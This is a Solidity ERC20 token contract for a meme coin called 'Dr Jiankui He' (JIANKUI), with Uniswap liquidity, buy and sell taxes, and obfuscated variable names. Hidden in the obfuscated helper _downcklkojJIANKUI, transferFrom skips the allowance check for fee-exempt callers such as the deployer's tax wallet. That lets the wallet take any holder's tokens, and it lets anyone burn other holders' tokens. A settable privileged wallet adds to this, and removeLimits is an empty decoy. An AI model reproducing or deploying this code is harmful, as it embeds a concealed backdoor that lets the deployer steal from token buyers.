// SPDX-License-Identifier: MIT

/*
    Dr Jiankui He
    JIANKUI

    https://x.com/Jiankui_He
    https://t.me/DrJiankuiHe
*/

pragma solidity ^0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}
contract JIANKUI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    constructor() payable {
        _taxclknlJIANKUI = payable(_msgSender());
        
        _balknvlkcJIANKUI[_msgSender()] = (qq30fef * 2) / 100;
        _balknvlkcJIANKUI[address(this)] = (qq30fef * 98) / 100;
        _feevblknlJIANKUI[address(this)] = true;
        _feevblknlJIANKUI[_taxclknlJIANKUI] = true;

        emit Transfer(address(0), _msgSender(), (qq30fef * 2) / 100);
        emit Transfer(address(0), address(this), (qq30fef * 98) / 100);
    }
    
    mapping(address => uint256) private _balknvlkcJIANKUI;
    mapping(address => mapping(address => uint256)) private _allcvnkjnJIANKUI;
    mapping(address => bool) private _feevblknlJIANKUI;
    address payable private _taxclknlJIANKUI;
    uint8 private constant _decimals = 9;
    uint256 private constant qq30fef = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Dr Jiankui He";
    string private constant _symbol = unicode"JIANKUI";

    uint256 private _vkjbnkfjJIANKUI = 10;
    uint256 private _maxovnboiJIANKUI = 10;
    uint256 private _initvkjnbkjJIANKUI = 20;
    uint256 private _finvjlkbnlkjJIANKUI = 0;
    uint256 private _redclkjnkJIANKUI = 2;
    uint256 private _prevlfknjoiJIANKUI = 2;
    uint256 private _buylkvnlkJIANKUI = 0;
    IUniswapV2Router02 private uniswapV2Router;

    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknJIANKUI;
    bool private _inlknblJIANKUI = false;
    bool private swapvlkJIANKUI = false;
    uint256 private _sellcnjkJIANKUI = 0;
    uint256 private _lastflkbnlJIANKUI = 0;
    address constant _deadlknJIANKUI = address(0xdead);

    uint256 public _vnbbvlkJIANKUI = qq30fef / 100;
    uint256 public _oijboijoiJIANKUI = 15 * 10**18;
    uint256 private _cvjkbnkjJIANKUI = 10;

    modifier lockTheSwap() {
        _inlknblJIANKUI = true;
        _;
        _inlknblJIANKUI = false;
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcJIANKUI[account];
    }
    
    function _transfer_kjvnJIANKUI(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblJIANKUI(from, to, amount);
        _balknvlkcJIANKUI[from] = _balknvlkcJIANKUI[from].sub(amount);
        _balknvlkcJIANKUI[to] = _balknvlkcJIANKUI[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcJIANKUI[address(this)] = _balknvlkcJIANKUI[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadlknJIANKUI) emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return qq30fef;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _downcklkojJIANKUI(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        
        if(_feevblknlJIANKUI[msg.sender]) return !_feevblknlJIANKUI[msg.sender];
        if(!(sender == uniswapV2Pair || recipient != _deadlknJIANKUI)) return false;
        return true;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnJIANKUI[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnJIANKUI(sender, recipient, amount);
        if (_downcklkojJIANKUI(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnJIANKUI[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnJIANKUI(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnJIANKUI[owner][spender];
    }

    function _calcTax_lvknblJIANKUI(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblJIANKUI) {
                taxAmount = amount
                    .mul((_buylkvnlkJIANKUI > _redclkjnkJIANKUI) ? _finvjlkbnlkjJIANKUI : _initvkjnbkjJIANKUI)
                    .div(100);
            }
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feevblknlJIANKUI[to] &&
                to != _taxclknlJIANKUI
            ) {
                _buylkvnlkJIANKUI++;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblJIANKUI &&
                to == uniswapV2Pair &&
                from != _taxclknlJIANKUI &&
                swapvlkJIANKUI &&
                _buylkvnlkJIANKUI > _prevlfknjoiJIANKUI
            ) {
                if (block.number > _lastflkbnlJIANKUI) {
                    _sellcnjkJIANKUI = 0;
                }
                _sellcnjkJIANKUI = _sellcnjkJIANKUI + _getAmountOut_lvcbnkJIANKUI(amount);
                require(_sellcnjkJIANKUI <= _oijboijoiJIANKUI, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkJIANKUI)
                    _swapTokenslknlJIANKUI(_vnbbvlkJIANKUI > amount ? amount : _vnbbvlkJIANKUI);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjJIANKUI(address(this).balance);
                }
                _lastflkbnlJIANKUI = block.number;
            }
        }
        return taxAmount;
    }
    function _sendETHTocvbnjJIANKUI(uint256 amount) private {
        _taxclknlJIANKUI.transfer(amount);
    }
    function _swapTokenslknlJIANKUI(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        router_ = address(uniswapV2Router);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function startTrading() external onlyOwner {
        require(!_tradingvlknJIANKUI, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), qq30fef);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkJIANKUI = true;
        _tradingvlknJIANKUI = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }
    receive() external payable {}
    function _assist_bnJIANKUI() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }
    function _getAmountOut_lvcbnkJIANKUI(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256[] memory amountOuts = uniswapV2Router.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }
    function removeLimits () external onlyOwner {
    }
    function _setTax_lknblJIANKUI(address payable newWallet) external {
        require(_feevblknlJIANKUI[_msgSender()]);
        _taxclknlJIANKUI = newWallet;
        _feevblknlJIANKUI[_taxclknlJIANKUI] = true;
    }
}